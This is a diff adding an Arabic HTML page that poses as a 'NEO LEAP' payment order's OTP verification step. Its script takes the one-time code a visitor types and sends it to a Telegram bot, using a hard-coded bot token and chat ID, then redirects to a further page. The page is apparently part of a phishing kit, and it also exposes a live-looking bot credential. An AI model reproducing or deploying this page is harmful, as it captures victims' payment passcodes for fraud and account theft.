@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="ar">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NEO LEAP</title>
+    <style>
+    /* تنسيق الجسم */
+body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    background-color: #f4f4f4;
+}
+
+/* تنسيق الرأس */
+header {
+    padding: 15px 30px;
+    background-color: #68c998; /* لون رأس الصفحة */
+    color: #ffffff;
+    text-align: center;
+}
+
+header .logo {
+    display: inline-block;
+    background-color: #ffffff; /* خلفية بيضاء للشعار */
+    padding: 10px;
+    border-radius: 10px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+}
+
+header .logo img {
+    max-width: 100px;
+}
+
+/* تنسيق محتوى الدفع */
+.payment-container {
+    background-color: #ffffff;
+    padding: 20px;
+    border-radius: 10px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    max-width: 400px;
+    margin: 30px auto;
+}
+
+.payment-container h1 {
+    text-align: center;
+    margin-bottom: 5px; /* تقليل المسافة السفلية */
+    color: #333;
+}
+
+/* تنسيق رقم الطلب */
+.order-number {
+    text-align: right; /* وضع النص في الجهة اليمنى */
+    font-size: 14px; /* حجم أصغر للنص */
+    color: #555;
+    margin-bottom: 20px; /* مسافة بين النص وبقية المحتوى */
+}
+
+label {
+    display: block;
+    margin-bottom: 5px;
+    color: #555;
+}
+
+input[type="text"] {
+    width: 100%;
+    padding: 10px;
+    margin-bottom: 20px;
+    border-radius: 5px;
+    border: 1px solid #ddd;
+}
+
+/* تنسيق Flexbox للحقلين */
+.flex-container {
+    display: flex;
+    justify-content: space-between;
+    gap: 20px; /* إضافة مساحة 20 بيكسل بين الحقلين */
+}
+
+.flex-item {
+    flex: 1;
+}
+
+button {
+    width: 100%;
+    padding: 10px;
+    background-color: #68c998; /* لون زر الإرسال */
+    color: #ffffff;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+}
+
+button:hover {
+    background-color: #57af80; /* تغيير اللون عند التمرير إلى درجة أغمق */
+}
+
+/* تنسيق أيقونات البطاقات الائتمانية */
+.cards-icons {
+    text-align: center;
+    margin-top: 159px;
+}
+
+.cards-icons img {
+    width: 300px;
+    margin: 0 10px;
+}
+
+/* تنسيق التذييل */
+footer {
+    padding: 15px 30px;
+    background-color: #333;
+    color: #ffffff;
+    text-align: center;
+    position: fixed;
+    bottom: 0;
+    width: 100%;
+}
+/* تنسيق نص نوع البطاقة */
+.card-type {
+  font-size: 14px;
+  color: #555;
+  margin-top: 10px;
+  text-align: right;
+}
+</style>
+</head>
+
+<body>
+    <header>
+        <div class="logo">
+            <img src="https://www4.0zz0.com/2024/09/01/00/965232977.png" alt="Logo">
+        </div>
+    </header>
+
+    <div class="payment-container">
+        <h1>NEO LEAP</h1>
+        <p class="order-number">Order N:70490</p> <!-- إضافة النص هنا -->
+
+
+    <div class="form-container">
+        <h1>التحقق من OTP</h1>
+        <form id="otp-form">
+            <label for="otp">رمز التحقق (OTP):</label>
+            <input type="text" id="otp" name="otp" required>
+            <button type="submit">تأكيد</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('otp-form').addEventListener('submit', function (event) {
+            event.preventDefault(); // منع إرسال النموذج بالطريقة الافتراضية
+
+            // الحصول على بيانات الحقل
+            const otp = document.getElementById('otp').value;
+
+            // إعداد رسالة لتنسيقها
+            const message = `رمز التحقق (OTP): ${otp}`;
+
+            // إعداد الرابط الخاص بالبوت
+            const botToken = '6538211018:AAEkfaMZAaoOccZJ0v9wKcgi8NXAsG-96iE'; // استبدل بـ توكن البوت الخاص بك
+            const chatId = '1002015547105'; // استبدل بـ معرّف الدردشة الخاص بك
+            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            // إرسال البيانات إلى بوت تيليجرام
+            fetch(apiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    // توجيه المستخدم إلى صفحة أخرى
+                    window.location.href = 'otp.html '; // استبدل بالصفحة التي تريد عرضها
+                } else {
+                    alert('حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.');
+            });
+        });
+    </script>
+</body>
+
+</html>
